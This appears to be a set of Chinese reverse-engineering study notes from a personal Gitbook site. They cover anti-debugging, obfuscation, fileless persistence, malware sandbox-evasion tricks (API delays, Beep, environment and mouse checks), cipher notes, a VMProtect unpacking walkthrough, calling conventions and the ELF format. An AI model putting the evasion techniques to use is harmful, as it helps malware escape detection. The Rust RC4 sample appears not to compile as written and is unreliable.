但是无论NumberOfRvaAndSizes是什么值，OllyDbg都使用它。因此，设置NumberOfRvaAndSizes为一个超过0x10的值，会导致在程序退出前，OllyDbg对用户弹出一个窗口。如图所示，使用LordPE打开可执行文件，修改RVA数及大小并保存，再用OllyDbg打开，会提示错误。 这个在x32dbg系列中已经不存在这个错误了。 三、静态混淆技术 加壳 压缩壳，加密壳，各种壳 控制流平坦化 这是在静态分析中最恶心的一种方式，因为没有完美的脚本可以完全去除混淆的影响 OLLVM中使用到的一种代码保护方式，它还有2个兄弟-虚假控制流和指令替换，这3种保护方式可以累加，对于静态分析来说混淆后代码非常复杂。 控制流平坦化的主要思想就是以基本块为单位，通过一个主分发器来控制程序的执行流程。类似于VMP保护的一种形式。 while+switch的结构，其中的switch可以理解为主分发器。通过ida观察可以很清楚的发现流程图都是正方形或者长方形。 通过简单代码的对比，不难发现混淆之后的区别 会看到出现了很多的while和switch，符合了开头那张图，主分发器进行程序控制，执行完一个小块后返回主分发器 下面就是主要的代码，剩下的就是各种分发器，控制程序执行流。 复原程序主要会用到的脚本是deflat.py其中的主要原理就是angr，这个之后再说 SMC 在程序运行期间边解密边运行的一种保护，self-modifying code。 使用具有一定的代价，因为需要开辟新的执行空间。开启固定基址，关闭随机基址，关闭数据保护 类名混淆 这是在net程序中常见的一种混淆方式，对命名空间，类，方法，字段进行重命名以增加阅读难度。这也不算壳，分析起来也比较麻烦。 反混淆也很困难。 文件不落地技术 不向磁盘写入可执行文件，而是以脚本形式存在计算机中的注册表子项目中，以此来躲避杀软的检测，那么绕过了传统防病毒（AV）寻找被保存到磁盘上的文件并扫描这些文件以确定它们是否恶意的查杀方法。 （二）沙箱对抗 降低自己的曝光率，防止过早暴露自己，所以需要一些技术对抗云沙箱。 Sleep类 常规等待 出于性能考虑，沙箱在执行程序时不可能长时间等待程序执行，因此衍生出了 延时执行的反沙箱技术：利用Windows API sleep 实现休眠，致使沙箱不执行恶意程序，进而绕过沙箱检测。 同时，沙箱开发者也通过hook Api的方式，缩短或绕过sleep的时间，对抗此类反沙箱技术。 现如今也存在着五花八门的API调用实现延迟执行恶意代码的效果，如: WaitForSingleObject、NtWaitForSingleObject、SetTimer、SetWaitableTimer、CreateTimerQueueTimer、socket 中的select函数等 一个高级的沙箱往往会对这些个会造成等待的函数进行hook绕过，来促进程序执行到核心代码的位置。往往一个样本中会使用多个等待类api来对抗沙箱 Beep 在新的攻击中出现了一种利用蜂鸣器来延时执行的目的。 BOOL Beep( [in] DWORD dwFreq, # 声音频率，赫兹为单位 [in] DWORD dwDuration # 声音的持续时间，毫秒为单位 ); 上述api在蜂鸣结束之前，不会释放程序的所有权，所以可以达到一个等待的目的，同时可以设置hz大小来绕过人耳检测 Check 检查硬件环境 检查磁盘大小 检查CPU个数 软件环境 检查自己是否被注入沙箱相关的dll 检查网络环境 检查进程列表定位特殊进程 交互检查 主动探测人机交互的行为，在一定的时间间隔内，两次获取当前鼠标在屏幕上的位置坐标，比较两次位置是否变化。 参考： 反调试技术 张君涛,王轶骏,薛质. 基于angr的对抗恶意代码沙箱检测方法的研究[J]. 计算机应用与软件,2019,36(2):308-314. DOI:10.3969/j.issn.1000-386x.2019.02.054. 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-09 17:20:59 "},"MyArticles/Re/常见加密算法-学习.html":{"url":"MyArticles/Re/常见加密算法-学习.html","title":"加密解密学习 - 更","keywords":"","body":"rc4 利用rust实现的rc4算法，顺便熟练一下rust。 use std::io::{self, Write}; fn rc4(key: &[u8], plaintext: &[u8]) -> Vec { let mut s: [u8; 256] = [0; 256]; let mut j = 0; for i in 0..256 {s[i] = i as u8;} for i in 0..256 { j = (j + s[i] + key[i % key.len()]) % 256; s.swap(i, j); } let mut i = 0; let mut j = 0; let mut ciphertext = Vec::with_capacity(plaintext.len()); for &byte in plaintext { i = (i + 1) % 256; j = (j + s[i]) % 256; s.swap(i, j); let k = s[(s[i] + s[j]) % 256]; ciphertext.push(byte ^ k); } ciphertext } fn main() { let mut input = String::new(); print!(\"Enter your key: \"); io::stdout().flush().unwrap(); io::stdin().read_line(&mut input).unwrap(); let key = input.trim().as_bytes(); input.clear(); print!(\"Enter your text: \"); io::stdout().flush().unwrap(); io::stdin().read_line(&mut input).unwrap(); let input = input.trim().as_bytes(); let mut output = Vec::new(); loop { input.clear(); print!(\"Do you want to encrypt (e) or decrypt (d) the text? \"); io::stdout().flush().unwrap(); io::stdin().read_line(&mut input).unwrap(); let input = input.trim(); if input == \"e\" { output = rc4(key, input); println!(\"Encrypted text: {:?}\", output); break; } else if input == \"d\" { output = rc4(key, input); println!(\"Decrypted text: {:?}\", output); break; } else { println!(\"Invalid input!\"); } } } 经典的对称加密的流密码，加密解密可以套用同一套公式。 密钥 真正参与运算加密的密钥是根据输入的密钥对数组进行初始化之后的数组数据，并未输入密钥直接参与运算。 密文 密文的产生是一个直接异或的结果，与明文进行异或的值是根据初始化之后的密钥数组进行位置交换、相加、定位后的值。 特征 对于s盒的初始化 相加定位后的异或 %256 ij位置的交换 DES 参考：《图解密码技术》、https://www.ruanx.net/des/ 对称密码、分组加密、基于 Feistel network （费斯妥网络：加密的各个步骤成为“轮”，整个加密过程就是若干次轮的循环） 分组长度：典型des加密分组长度为64位（8字节），不能整除用 PKCS7 / PKCS5 填充（一般）。基于这个网络的设计，可以重复足够多的轮次，而且可以保证解密） 密钥组成：长度64位，第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1 流程图： 密钥 首先去掉特殊的8位，剩下的56位分成两组（28bit/组） 进行循环左移，按照一定的位数移动，两组都移动 密文 明文输入之后先进行分组，分为32+32bit的形式（一组64位，8字节） 一侧明文与【对应轮次产生的子密钥（局部密钥）和另一侧明文】产生的数组进行 xor 另一侧直接落下来 这样就组成了 “密文+明文” 这样的组合,这是一轮的加密，然后对于一个正常的加密就是将上述的结果交换左右，完事继续加密。 每次加密一半，第二次根据第一次加密的结果加密另一半。因为是通过的xor操作进行的加密，所以解密过程也很简单 3des 这个是为了防止des被短时间内爆破出来而做出的改进，就是将DES重复三次，所以他的密钥长度是168bit 这个3des可以在密钥相同的情况下等价于DES加密。 解密 利用相同位置的密钥，将加密和解密对调一下就可以。 RSA 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-12 13:57:22 "},"MyArticles/Re/分组密码学习.html":{"url":"MyArticles/Re/分组密码学习.html","title":"分组密码","keywords":"","body":"流密码 像流水一样，从头到尾的一种加密算法。 以一定的bit位数为分组进行加密，结束一个分组的加密就继续进行下一个分组的加密，需要内部保存一个当前的加密状态。对称加密算法基本都是基于分组加密的形式而不是流密码的形式。 分组密码 AES和DES还有3DES等等都是对称加密里的分组密码模式。 模式 因为分组密码对于每一组的加密的明文都是固定长度的，一般情况下都需要对加密算法进行迭代加密。为了解决这个迭代的问题，于是有了下面的常见的几种模式（常见）： 模式的名称都是他的全名的缩写，全名我记不住。 ECB：电子密码本 CBC：密码分组链接模式 CFB：密文反馈模式 OFB：输出反馈模式 CTR：计数器模式 ECB：电子密码本 最简单的、容易被攻击的一种模式，一般没人用。 过程 将明文按照指定的大小分组，然后每一组分别加密，密文按照顺序排列成最终密文。 对应的解密模式也是将密文分组之后分别解密得到明文。 因为11对应的关系，所以被称为电子密码本。 攻击方式 观察密文中的重复序列，可以对应出明文中的重复序列，可以推测明文。 修改密文顺序，直接控制明文顺序 密文替换，利用相同算法的密文替换原来密文中的密文 CBC：密码分组链接 将前一个密文分组和当前明文分组混合起来加密，密文像链条一样相互连接。 过程 首先将本组明文和上一组的密文进行xor之后再进行加密，第一次明文用初始向量IV进行异或 解密过程：因为是xor，所以算法过程完全可逆 加密的链条就是通过xor进行连接的 攻击方式 反转IV中的bit位，通过观察第一组的变化可以达到攻击初始向量IV的效果 CFB：密文反馈 前一个密文分组，会被当作输入，送回算法的输入端（这里体现的“反馈”）。 过程 该模式的加密并不体现在明文和密文的对应上，而是对前一组密文的加密上，当前组明文和前一组密文异或得到这一组的密文。 解密过程： 思路同上述模式 特点 使用分组密码的思想实现的流密码加密方式。初始向量IV相当于一个种子，每次的加密过程相当于产生随机数的过程，但是是伪的。 攻击方式 使用重放攻击。 取相同密钥和iv的两次加密，用第一次加密的后三项内容替换第二次的后三项内容，这样就会导致解密过程中第一组成功解密，第二组密文解密失败，因为被替换，无法通过xor还原，但是后面的可以成功解密达到攻击密文的效果。 OFB：输出反馈 和CFB类似但是不同，也是加密的结果会当作输入再进行操作。但是在这种模式中，初始向量更加重要一下 与CFB模式的比较 OFB反馈的不是明文的密文，而是iv向量的密文 CTR：计数器模式 将逐次累加的计数器进行加密，生成密钥流的流密码 计数器的生成 每次加密的时候先产生一个随机值当作初始值。该数字分为两部分，前面的一部分就是随机数本身，后面的字节就是分组的序号（1，2，3，4……之类的）比如： 与OFB 都属于是流密码，所以存在异同。 ofb利用的加密的输出当作输入，该模式利用的是计数器当作输入。 特点 可以用于并行计算。因为可以以任意顺序对分组进行加密和解密，计数器的值可以由随机数和序号计算得到。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-21 23:34:25 "},"MyArticles/Re/vmp3.5unpacke.html":{"url":"MyArticles/Re/vmp3.5unpacke.html","title":"vmp3.X 工具向脱壳","keywords":"","body":"vmp壳一直是作为加密壳中的一个难啃的骨头，这次从工具使用角度学习一下这个脱壳的过程，本次尝试vmp3.4。3.x的系列都差不多 源码 #include #include #include #include void get_promt() { if(MessageBox(NULL,TEXT(\"context\"),TEXT(\"title\"),MB_OK)) { printf(\"1212121212\\n\"); } else { printf(\"error\"); } } int main() { printf(\"this is main func\\n\"); char str_ptr[] = \"please input a string: \"; char str[128]; char flag[15] = \"aabbccddeeff\"; scanf(\"%s\", str); if(strlen(str) 加壳 使用52破解上找到的vmp软件按照默认的配置对程序进行加壳 都是默认配置，模仿的是大多数的情况，也是常见的一种加密模式。实际上VMP强大之处在于它的虚拟功能，但是默认是关闭的。 得到加密后的程序。大小相比于源程序扩大20倍左右 调试 因为程序多次中断跑飞，所以这些截图可能不是来自同一次进程，所以辩证看待 调试器配置 断点 断点要求：如图 这也是调试器的默认配置，断点不宜太多，会触发vmp的完整性检测。 增强 使用插件sharpOD，这个和xdbg是通用的 添加这些功能是为了防止vmp的一个检测，然后主要选这几个就行，主要是防止被检查调试器。 区段对比 看到相较于正常程序，他出现了vmp0和1两个段。 这是正常的程序区段详情 注意一下地址的范围。 进行调试 找入口点特征 利用gcc编译的，所以需要定位一下start函数的部分，同时需要看到函数入口点的位置特征 看到这个call和jmp的结构，类似于MSVC编译的结构。 call ___security_init_cookie 跟进这个函数，发现两个函数 脱壳 直接在动态调试中找到这两个函数然后下断点，然后通过栈回溯的方式进行定位。 GetSystemTimeAsFileTime --> 在kernelbase中，直接在dll界面下断点就行 另一个同理，下好断点，断点下的要靠后一点，避免VMP的头部断点检测。 直接f9运行，程序断在如下图位置 通过内存布局定位，发现还在vmp区段里，那就继续运行，可能是其他的地方也调用了同样的api函数 直接f9就可以，然后观察啊堆栈窗口 看到返回地址更新了。这一次程序已经来到text区段算是成功进来程序本身了。 看到ida里的伪代码（未加壳的程序）如图 第一个函数已经断进程序本身了，继续运行断第二个api。 需要注意的是，断点下载了kernelbase中，重新调试的时候会出现0xc000007b错误，这时候需要顶着错误进断点界面把俩kernelbse的断点删除，或者删除xdbg的缓存或者改个文件名。 还有需要注意的是，不要一载入程序就下断点，先运行一步到程序领空之后，再去下这个api断点。 看到程序已经跳转到了正常的text段的一个程序里了。 我们开始通过ida可以看到，程序的start函数的形式是一个call+jmp的形式 所以我们继续调试下去，当进入正常text段凌空之后就不要f9了，会直接跑飞，所以慢慢调试。 来到这里，看起来结构和没加科的入口点就很相似了，看了一下基本是一样的，然后直接把eip蹦到sub指令上，然后使用一个github脚本恢复一下iat。 C:\\Users\\Rootkit\\Desktop>vmp3-import-fix -p 16200 start emualte pattern address:00401238 start emualte pattern address:00401433 start emualte pattern address:00401555 start emualte pattern address:00401730 start emualte pattern address:0040178F start emualte pattern address:004017A0 start emualte pattern address:004017A8 start emualte pattern address:004017B1 start emualte pattern address:004017BF start emualte pattern address:00401860 start emualte pattern address:0040186F start emualte pattern address:00401878 start emualte pattern address:0040188A start emualte pattern address:00401B17 start emualte pattern address:00401B6D start emualte pattern address:00401D5E start emualte pattern address:0040207F start emualte pattern address:00402091 start emualte pattern address:004020CC start emualte pattern address:00402122 start emualte pattern address:00402141 start emualte pattern address:00402187 start emualte pattern address:004021C7 start emualte pattern address:00402247 start emualte pattern address:004022AC start emualte pattern address:004026AD start emualte pattern address:004026B5 start emualte pattern address:004026BC start emualte pattern address:004026C4 start emualte pattern address:004026CC start emualte pattern address:004026D4 start emualte pattern address:004026DD start emualte pattern address:004026E5 start emualte pattern address:004026ED start emualte pattern address:004026F4 start emualte pattern address:004026FC start emualte pattern address:00402705 start emualte pattern address:0040270C start emualte pattern address:00402714 start emualte pattern address:0040271D start emualte pattern address:00402724 start emualte pattern address:0040272D start emualte pattern address:00402734 start emualte pattern address:0040273C start emualte pattern address:00402745 start emualte pattern address:0040274C start emualte pattern address:00402754 start emualte pattern address:0040275C start emualte pattern address:00402765 start emualte pattern address:0040276D VirtualAlloc IAT address:00EB0000 完事之后可以去对应的地址看一下是不是真的被复原了。经过验证那些call确实已经被还原名称了。 利用xdbg自带的脚本进行dump，直接dump就可以，dump之后通过cff去观察一下文件的几个指标： 入口点（这里的入口点和源程序的出口点一样的，并没有发生改变） 是否重定位（关掉） 然后点击下面的东西，看一下重定位 之后使用UIF工具进行IAT重建（针对这个进程）。 重建结束之后，使用另一个工具进行[fix dump][https://www.52pojie.cn/thread-66558-1-1.html]而不是xdbg去修复，这里要注意 注意这些参数，防止出问题，然后点击那个get import，之后fixdump即可 将得到的最后的文件放进ida进行查看，可以看到效果已经非常好了 总结 面对一个默认配置加壳的vmp程序的整体的脱壳思路： 定位两个关键api（kernelbase的GetSystemTimeAsFileTime、ntdll的QueryProformanceCounter）。 在api尾部下断点，不要都下载ret之前，最好有一定的辨识度。 观察堆栈，在执行完QueryProformanceCounter的断点之后注意返回text领空的情况。 在text段向上寻找程序入口点，利用dos脚本进行修复。 利用xdbg自带的脚本进行dump。 检查dump文件。 ufi修复进程，IF重建进程后修复dump文件。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-24 09:20:57 "},"MyArticles/Basics.html":{"url":"MyArticles/Basics.html","title":"Basics","keywords":"","body":"合抱之木，生于毫末；百丈之台，起于垒土；千里之行，始于足下。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:38:21 "},"MyArticles/Basics/调用约定和断点.html":{"url":"MyArticles/Basics/调用约定和断点.html","title":"调用约定和断点","keywords":"","body":"调用约定 定义子过程从调用处接受参数以及返回结果的方法的约定，在常见的许多调用约定中，就是为了解决如下几个问题： 参数和返回值的位置 参数传递的顺序 调用前后的栈清理工作 常见的调用约定有 stdcall cdecl fastcall thiscall naked call 参数传递 32-bit Windows linux 无论是Windows还是linux，在32位程序下都是使用的 栈 来传递，先将参数push到栈，然后将返回地址push进去，然后jmp到函数地址。 64-bit Windows 默认是使用fastcall的调用约定，前4个参数使用： rcx, rdx,r8, r9 来传递参数，多余的参数放到栈中传递 linux linux下的前六个参数都是使用寄存器来传递，多余的参数放到栈上执行。 rdi, rsi, rdx, rcx, r8, r9 stdcall 这是win32 API和WinMain还有CAllBACK函数的默认的调用约定，在C语言中可以使用前缀关键字的方式来规定采用何种调用约定 参数从右向左压入堆栈 函数自身修改堆栈 函数的装饰名(decoration name/mangling name)为函数名自动加前导的下划线, 后面紧跟一个@符号, 其后紧跟着参数的尺寸 int __stdcall add(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k) 上述函数从栈结构可以清楚的看到 cdecl cdecl调用约定又称为C调用约定, 是C语言缺省的调用约定, 它的定义语法是: int function(int a, int b) //不加修饰默认就是C调用约定 int __cdecl function(int a, int b) //明确指定C调用约定 参数从右向左压入堆栈 函数的调用者修改堆栈 fastcall 这是win64位下的默认调用方式 通过rcx、rdx和r8，r9传递, 其他参数通过从右向左的顺序压栈 浮点数参数在 XMM0L、XMM1L、XMM2L 和 XMM3L 中传递 被调用函数清理堆栈 修饰名为函数名前加上一个“@”符号，后面也是一个“@”符号和其参数的字节数 断点类型 常见断点类型分为 软件断点 硬件断点 内存断点 软件断点 又称为int3断点，这种实现方式就是将当前的指令修改成0xcc，程序运行到这里会触发异常，调试器捕获到这个异常，实现断点的功能 缺点 上述断点会修改程序的内存，如果程序本身有完整性检查的话就会出问题。病毒程序经常检测程序在内存中运行的代码的 CRC 值是否相同。如果不同，说明数据被修改，则自动杀掉自己。 硬件断点 缺点 只能设置4个，而且需要内存对其（1，2，4，8）字节的断点类型，都需要对其（1字节的不需要）。 使用 一个CPU一般有8个调试寄存器（DR0 ~ DR7 寄存器），用于管理硬件断点 DR0 ~DR3： 存储硬件断点地址。 DR4 和 DR5： 保留。 DR6：调试状态寄存器，用于向调试器报告事件的详细信息，以供调试器判断发生的是何种事件。 DR7：调试控制寄存器，用于定义断点的中断条件。 软件断点是int3断点，硬件断点是int1断点。 在 CPU 每次执行代码之前，都会先确认当前将执行的代码的地址是否是硬件断点的地址，同时也要确认是否有代码要访问被设置了硬件断点的内存区域。 上述俩断点都只能在有限的区域内下断点，不能大面积下断点。在脱壳的时候会用到硬件断点。 gdb 在gdb中可以使用命令 hbreak 下一个硬件断点 内存断点 原理 将下断地址所在的内存页增加一个名为PAGE_NOACCESS的属性，这个属性会把当前内存页设为禁止任何形式的访问，如果进行访问会触发一个内存访问异常。在这同时，调试器捕获目标程序中的这个异常，并判断触发这个异常的位置是否跟你下断的地址相同，如果相同则内存断点触发，暂停被调试程序的运行，否则放行。 虽然内存断点的效率经常很不理想，但是因为仅仅是修改了一个内存属性，所以内存断点可以下数量非常多、单断点范围非常大。这是它的优势。 只在写入时断下的内存断点通常是将内存属性设为PAGE_EXECUTE_READ，也就是不可写来实现的。对这种属性的内存进行写操作将会触发异常。 优点 可以大范围的下断点，在脱壳的时候常用。 本质 他并不是修改某一个特定的指令，而是改变了内存中某个块或者页的权限。 一个内存页是操作系统处理的最小的内存单位。一个内存页被申请成功以后，就拥有了一个权限集，它决定了内存该如何被访问。 可执行页：允许执行但不允许读或写，否则抛出访问异常。 可读页：只允许从页面中读取数据，其余的则抛出访问异常。 可写页：允许将数据写入页面。 一般来说可执行的页不会具有写权限。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-10 21:13:55 "},"MyArticles/Basics/elf文件结构.html":{"url":"MyArticles/Basics/elf文件结构.html","title":"ELF structure","keywords":"","body":"PE是Windows下的文件，elf是linux下的文件。学习网络前端Windows是主要市场，后端服务端则是linux的天下。学习pe文件结构也要学习elf文件结构。前端的Windows病毒来势凶猛，后端的linux攻击也是防不胜防。挖矿病毒肆虐；僵尸网络横行，不懂elf文件结构怎能进入网络安全这一大主题的门槛。 当时在进行pwn入门的时候，没有学习elf的文件结构，只是知道了怎么用，在哪里用，现在了解了文件结构，对以往的pwn知识有了更加深入的理解。 结构综述 ELF文件由四部分组成：ELF头、程序头、节、节头 本文以一个简单的C语言文件当作例子 #include int main() { printf(\"hello world\\n\"); return 0; } 为了方便正常人的思路，记录顺序做了一下调整。 ELF头 可以在文件：/usr/include/elf.h中找到定义 #define EI_NIDENT (16) typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */ } Elf32_Ehdr; typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf64_Half e_type; /* Object file type */ Elf64_Half e_machine; /* Architecture */ Elf64_Word e_version; /* Object file version */ Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; /* Processor-specific flags */ Elf64_Half e_ehsize; /* ELF header size in bytes */ Elf64_Half e_phentsize; /* Program header table entry size */ Elf64_Half e_phnum; /* Program header table entry count */ Elf64_Half e_shentsize; /* Section header table entry size */ Elf64_Half e_shnum; /* Section header table entry count */ Elf64_Half e_shstrndx; /* Section header string table index */ } Elf64_Ehdr; 存在32和64两种类型，基本一样的。 Elf64_Half和Elf64_Word是uint16_t uint32_t的预定义 在里面挑了几个重要的，记录一下，其他的不重要的就让他在书上吧。 e_ident数组 该数组首先以特定的4字节字符串开头\\x7fELF，这可以让文件加载器快速的认出来他是一个二进制文件， 通过命令readelf -h learnS 如果在编译的时候不添加-no-pie，这里的entry point addtress就是一个偏移。 e_type 这个多字节数组指定了elf文件的类型，一般有三种类型 ET_REL: 可重定位的对象文件 ET_EXEC：可执行的二进制文件 ET_DYN：共享对象文件（共享库） 例如下面的这个so.2程序 e_phoff和e_shoff e_shoff：section header offset,另一个同理是程序段的偏移，根据这两个值可以找到程序头和节头，一个是64字节，一个是6632字节。 注意：这里可以设置为0，意味着程序不包含程序头表和节头表；这里的地址不是虚拟地址，而是偏移量。 e_ehsize 该字段阐述了elf头部的大小，对于64位程序来说，大小就是64字节；对于32位的程序来说，elf头部的大小是52字节 e_shstrndx 该字段中包含一个名为.shstrndx的和特殊字符串表节相关的头索引。 这个.shstrtab在节头表中，这是一个专用节，包含一个以NULL值结尾的一个ascii数组。一个节一个名称。 readelf -x .shstrtab learnS 通过这个可以用16进制的形势查看内容。 在该头里其他的部分看起来对于逆向分析没有什么作用。 节头表 1.节：elf文件中代码和数据在逻辑上被分为连续的非重叠块，称为节（section）。 2.对于节的描述：没有任何预设的结构体，每个节的结构体取决于内容。每个节由节头描述，节头指定了节的属性。二进制中所有的节的节头都在节头表中。 3.节只是为链接器提供视图，因此是可选部分，不需要链接的二进制文件就不需要节头表，没有节头表，就将e_shoff的值设为 0.当二进制文件创建进程开始执行的时候，并不是所有的节都会载入内存，比如符号信息或者重定位信息。 段和节 二进制文件制定了另一种逻辑组织，称为段，段在文件执行的时候被使用；而节在连接时被使用。 同样在上述目录中，可以找到关于节头的定义 /* Section header. */ typedef struct { Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */ } Elf32_Shdr; typedef struct { Elf64_Word sh_name; /* Section name (string tbl index) */ Elf64_Word sh_type; /* Section type */ Elf64_Xword sh_flags; /* Section flags */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Section size in bytes */ Elf64_Word sh_link; /* Link to another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */ } Elf64_Shdr; sh_name 这是节头的第一个字段，如果被设置，则在字符串表中包含索引；如果索引是0，则该节没有名称。 这里存在一个大致这样的流程。 sh_type 该字段阐述了节的类型，存在多种类型，在链接时会用到，内容不重要。 sh_flags 关于节的其他信息，其中最重要的有三种：SHF_WRITE、SHF_ALLOC 、SHF_EXECINSTR。 SHF_WRITE 在运行时可写，可以用来区分包含静态数据的节和包含变量的节。 SHF_ALLOC 指示在执行二进制文件的时候将该节的内容加载到虚拟内存，虽然在执行时是按照段视图。 SHF_EXECINSTR 指示该节包含可执行指令。 sh_addr、sh_offset、sh_size 描述该节的虚拟地址、文件偏移、节大小。 当设置sh_addr的值为0时，表示节不会加载到虚拟内存中。 其他 其他字段都不重要了 节 通过命令readelf --sections --wide learnS来查看节信息。可以看到节头表第一项由一个NULL项，这是标准的。 Section Headers: [Nr] Name Type Address Off Size ES Flg Lk Inf Al [ 0] NULL 0000000000000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 0000000000400238 000238 00001c 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 0000000000400254 000254 000020 00 A 0 0 4 [ 3] .note.gnu.build-id NOTE 0000000000400274 000274 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 0000000000400298 000298 00001c 00 A 5 0 8 [ 5] .dynsym DYNSYM 00000000004002b8 0002b8 000060 18 A 6 1 8 [ 6] .dynstr STRTAB 0000000000400318 000318 00003f 00 A 0 0 1 [ 7] .gnu.version VERSYM 0000000000400358 000358 000008 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 0000000000400360 000360 000020 00 A 6 1 8 [ 9] .rela.dyn RELA 0000000000400380 000380 000030 18 A 5 0 8 [10] .rela.plt RELA 00000000004003b0 0003b0 000018 18 AI 5 22 8 [11] .init PROGBITS 00000000004003c8 0003c8 000017 00 AX 0 0 4 [12] .plt PROGBITS 00000000004003e0 0003e0 000020 10 AX 0 0 16 [13] .text PROGBITS 0000000000400400 000400 000182 00 AX 0 0 16 [14] .fini PROGBITS 0000000000400584 000584 000009 00 AX 0 0 4 [15] .rodata PROGBITS 0000000000400590 000590 000010 00 A 0 0 4 [16] .eh_frame_hdr PROGBITS 00000000004005a0 0005a0 00003c 00 A 0 0 4 [17] .eh_frame PROGBITS 00000000004005e0 0005e0 000100 00 A 0 0 8 [18] .init_array INIT_ARRAY 0000000000600e10 000e10 000008 08 WA 0 0 8 [19] .fini_array FINI_ARRAY 0000000000600e18 000e18 000008 08 WA 0 0 8 [20] .dynamic DYNAMIC 0000000000600e20 000e20 0001d0 10 WA 6 0 8 [21] .got PROGBITS 0000000000600ff0 000ff0 000010 08 WA 0 0 8 [22] .got.plt PROGBITS 0000000000601000 001000 000020 08 WA 0 0 8 [23] .data PROGBITS 0000000000601020 001020 000010 00 WA 0 0 8 [24] .bss NOBITS 0000000000601030 001030 000008 00 WA 0 0 1 [25] .comment PROGBITS 0000000000000000 001030 000029 01 MS 0 0 1 [26] .symtab SYMTAB 0000000000000000 001060 0005b8 18 27 43 8 [27] .strtab STRTAB 0000000000000000 001618 0001cc 00 0 0 1 [28] .shstrtab STRTAB 0000000000000000 0017e4 000103 00 0 0 1 .init和.fini节 .init .init节中包含可执行代码，用来初始化程序。在程序将控制权移动到main函数之前，由init里的代码掌握。可以看作是构造函数。 .fini节 在程序执行结束之后执行的，和析构函数一样。 .text节 该节包含了程序的主要代码。 一般来说，可执行的节是不可写的，可写的是不可执行的（出于安全考虑） 在本例中（标准gcc编译的程序）中text节中包含多个开始任务和结束任务的标准函数： _start register_tm_clones frame_dummy这仨比较重要。 _start 函数 通过objdump -M intel -d learnS可以看到不同函数的反汇编。 在地址0x400424的地址处，调用了__libc_start_main函数，这里查看rdi寄存器，可以看到是程序main函数的地址。 这就是为什么gdb里下断点会下在这里，查看rdi的值获得main函数的地址 .bss和.data还有.rodata 因为代码节不可写，所以变量会保存在多个可写的专用节中。 .rodata read only data代表.rodata ，用来存储常量。 .data 初始化变量的默认值存放在这个节里。因为变量会被修改，所以标记为可写的节。 .bss 为了未初始化变量保留的空间，该节不会占用磁盘上的空间，只在二进制文件创建执行环境的时候为没有初始化的变量分配内存。该节是可写的。 延迟绑定plt、got plt表：（过程链接表）Procedure Linkage Table； got表：（全局偏移表）Gobal Offset Table； 为什么要延迟绑定：保证了动态链接器不会在重定位上浪费时间，只在需要的时候执行。 注意：若程序有实时性能的要求，则可以通过在bash中exportLD_BIND_NOW=1来取消动态绑定。 .got.plt（GOT表）这是一个单独的节，是运行时可写的，如果程序开启了RELRO（重定位只读）防御got表覆盖攻击，那么got表不可写，这时就将会变化的值放在了这个表中，方便运行时改变。 .plt.got（PLT表）这是一个备用的plt表，他的大小是8字节，在开启got不可写之后该表会代替16字节的plt表。 got节用于引用数据项，got,plt节用来存放通过plt访问（已经解析的）的库函数地址 执行流程 00000000004003e0 : 4003e0: ff 35 22 0c 20 00 push QWORD PTR [rip+0x200c22] # 601008 4003e6: ff 25 24 0c 20 00 jmp QWORD PTR [rip+0x200c24] # 601010 4003ec: 0f 1f 40 00 nop DWORD PTR [rax+0x0] 00000000004003f0 : 4003f0: ff 25 22 0c 20 00 jmp QWORD PTR [rip+0x200c22] # 601018 4003f6: 68 00 00 00 00 push 0x0 4003fb: e9 e0 ff ff ff jmp 4003e0 通过命令objdump -M intel --section .plt -d learnS可以看到上面的汇编结构。 地址4003e0处作为 “默认存根” 地址4003f0处作为“函数存根” plt存根以间接跳转指令开头，这导致他跳转到存储在.got.plt节中的地址（4003f0处的行为）。 在延迟绑定之前，该地址是函数存根下一条（push）指令的地址，间接跳转将控制权交给地址4003f6. 将0x0压入栈中（这是plt存根的标识符）。 4003fb地址的行为跳转到所有plt函数存根之间共享的通用默认存根。 默认存根push另一个标识符（从got中获得）表示可执行文件自身。间接的通过got跳转到动态链接器。 标识符 通过push plt存根的标识符，动态链接器可以确定puts函数的位置，并且这样还代表main函数已经加载到内存中了。 